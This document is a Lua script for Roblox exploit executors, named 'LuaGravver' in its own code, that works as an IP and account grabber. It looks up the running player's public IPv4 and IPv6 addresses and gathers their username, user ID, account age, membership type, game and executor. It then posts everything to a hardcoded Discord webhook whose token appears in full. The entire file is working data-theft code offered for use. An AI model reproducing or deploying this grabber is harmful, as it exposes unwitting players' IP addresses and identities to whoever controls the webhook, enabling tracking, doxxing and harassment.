local Webhook = "https://discord.com/api/webhooks/1321576472929898566/dgtXAULg9GZxOm1JNZYzkA0t_WFsxNC9PulrgP5q2KIfK5K-e9Xe4z_uKjncadqn4sFq" -- Put your Webhook link here
local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
-- TODO: Using Shodan API

local Headers = {["content-type"] = "application/json"} -- DO NOT TOUCH

local LocalPlayer = game:GetService("Players").LocalPlayer -- LocalPlayer

local AccountAge = LocalPlayer.AccountAge -- Account age since created
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) -- Membership type: None or Premium
local UserId = LocalPlayer.UserId -- UserID
local PlayerName = LocalPlayer.Name -- Player name
local DisplayName= LocalPlayer.DisplayName
local PlaceID = game.PlaceId -- The game that player is playing


local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged
local rver = "Version 1" -- Change to your version if you want

--[[ Identify the executor ]]--
-- https://v3rmillion.net/showthread.php?tid=1163680&page=2
function identifyexploit()
   local ieSuccess, ieResult = pcall(identifyexecutor)
   if ieSuccess then return ieResult end
   
   return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
end

--[[ Webhook ]]--
local PlayerData = {
        ["content"] = "",
        ["embeds"] = {{
           
            ["author"] = {
                ["name"] = "LuaGravver "..rver, -- Grabber name and version
            },
           
            ["title"] = PlayerName, -- Username/PlayerName
            ["description"] = "aka "..DisplayName, -- Display Name/Nickname
            ["fields"] = {
                {
                    --[[Username/PlayerName]]--
                    ["name"] = "Username:",
                    ["value"] = PlayerName,
                    ["inline"] = true
                },
                {
                    --[[Membership type]]--
                    ["name"] = "Membership Type:",
                    ["value"] = MembershipType,
                    ["inline"] = true
                },
                {
                    --[[Account age]]--
                    ["name"] = "Account Age (days):",
                    ["value"] = AccountAge,
                    ["inline"] = true
                },
                {
                    --[[UserID]]--
                    ["name"] = "UserId:",
                    ["value"] = UserId,
                    ["inline"] = true
                },
                {
                    --[[IPv4]]--
                    ["name"] = "IPv4:",
                    ["value"] = IPv4,
                    ["inline"] = true
                },
                {
                    --[[IPv6]]--
                    ["name"] = "IPv6:",
                    ["value"] = IPv6,
                    ["inline"] = true
                },
                {
                    --[[PlaceID]]--
                    ["name"] = "Place ID: ",
                    ["value"] = PlaceID,
                    ["inline"] = true
                },
                {
                    --[[Exploit/Executor]]--
                    ["name"] = "Executor: ",
                    ["value"] = identifyexploit(),
                    ["inline"] = true
                },
                {
                    --[[Log/Grab time]]--
                    ["name"] = "Log Time:",
                    ["value"] = LogTime,
                    ["inline"] = true
                },
            },
        }}
    }


local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
    HttpRequest = syn.request
    else
    HttpRequest = http_request
end

-- Send to your webhook.
HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})